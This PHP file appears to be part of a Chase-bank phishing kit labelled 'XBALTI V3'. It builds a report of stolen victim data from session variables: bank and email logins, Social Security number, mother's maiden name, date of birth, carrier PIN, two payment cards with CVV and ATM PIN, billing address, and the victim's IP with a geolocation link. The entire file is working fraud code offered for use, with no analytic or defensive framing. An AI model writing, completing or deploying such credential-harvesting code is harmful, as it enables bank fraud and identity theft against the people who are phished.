<?php
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$XBALTI_MESSAGE .= "==============||SSN/MMN/DOB INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "SSN      	: ".$_SESSION['ssnnum']."<br>\n";
$XBALTI_MESSAGE .= "MMN      	: ".$_SESSION['mdn']."<br>\n";
$XBALTI_MESSAGE .= "DOB     	: ".$_SESSION['dob']."<br>\n";
$XBALTI_MESSAGE .= "Phone number: ".$_SESSION['phone']."<br>\n";
$XBALTI_MESSAGE .= "Carrier pin : ".$_SESSION['capin']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnu']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expda']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvv']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pin']."<br>\n";
$XBALTI_MESSAGE .= "==============||BILLING INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "FULL NAME   : ".$_SESSION['fullname']."<br>\n";
$XBALTI_MESSAGE .= "Address 	: ".$_SESSION['Address']."<br>\n";
$XBALTI_MESSAGE .= "City     	: ".$_SESSION['City']."<br>\n";
$XBALTI_MESSAGE .= "State    	: ".$_SESSION['State']."<br>\n";
$XBALTI_MESSAGE .= "zip code    : ".$_SESSION['zipcode']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnutwo']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expdatwo']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvvtwo']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pintwo']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";

?>